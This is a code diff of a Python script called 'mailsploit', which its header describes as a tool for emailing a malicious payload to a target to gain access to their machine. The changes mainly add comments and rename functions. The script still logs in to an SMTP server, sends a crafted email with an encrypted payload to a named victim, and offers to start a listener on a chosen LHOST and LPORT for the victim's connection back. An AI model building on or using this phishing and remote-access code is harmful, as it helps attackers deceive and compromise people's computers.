@@ -3,7 +3,7 @@
 # Title: mailsploit
 # Author: Th3J0k3r
 #
-# Purpose: to be able to send a malicious payload via email
+# Purpose: to be able to send a malicious link via email
 # to gain access to somones machine.
 #
 ############################################################
@@ -21,6 +21,9 @@ import os
 from lazyme.string import color_print
 
 
+#
+# Prints a banner.
+#
 def banner ():
 
 	os.system("clear")
@@ -39,7 +42,10 @@ def banner ():
 """, color='red')
 
 
-def exploit ():
+#
+# Sets up the configuration file.
+#
+def setup ():
 
 	# Setup the config file
 	global targetName
@@ -64,6 +70,14 @@ def exploit ():
 	if email == 'None' or password == 'None' or target == 'None' or targetName == 'None':
 		color_print('[!] Please setup your config file.', color='red')	
 		return
+
+	# Connects to the server.
+	connect()
+
+#
+# Connects to the smtp server.
+#
+def connect():
 
 	# get the smtp server via user input.
 	color_print("[ Press enter twice to send via gmail ]", color='blue')
@@ -101,14 +115,21 @@ def exploit ():
 		smtp.debuglevel = debuglevel
 		smtp.login(email, password)
 		color_print("\n Logged in.", color='green')
-		sendpayload(smtp)
+
+		# Build the email.
+		buildEmail(smtp)
+
+
 	except smtplib.SMTPAuthenticationError:
-		color_print("\nFaild to login try turning on lesssecureapps from 'https://myaccount.google.com/lesssecureapps'")
+		color_print("\nFaild to login try turning on lesssecureapps from 'https://myaccount.google.com/lesssecureapps'", color='red')
 		return
 
 
 
-def sendpayload (server):
+#
+# Builds the email.
+#
+def buildEmail (server):
 
 
 	# Encrypt the payload
@@ -164,13 +185,19 @@ Hi """ + targetName + """,
 		listen = raw_input('Do you want to start up a listener: [Y/N]: ')
 		if listen == 'Y' or listen == 'y' or listen == 'yes' or listen == 'Yes':	
 			color_print("[+] Starting a listener", color='blue')
+
+			# Listen for a connection
 			listenForConnections()
 		else:
 			color_print("Thanks, Happy hacking", color='blue')
 			return	
 	else:
 		color_print("[!] Please put your payload in " + payload + " For it to work!!", color='red')	
-			
+	
+
+#
+# Listen for a connection
+#		
 def listenForConnections ():
 	lhost = raw_input('What is your LHOST (local ip address): ')
 	lport = raw_input('What is your LPORT (port): ')
@@ -193,4 +220,4 @@ def listenForConnections ():
 
 #### Call the methods ####
 banner()
-exploit()		
+setup()		
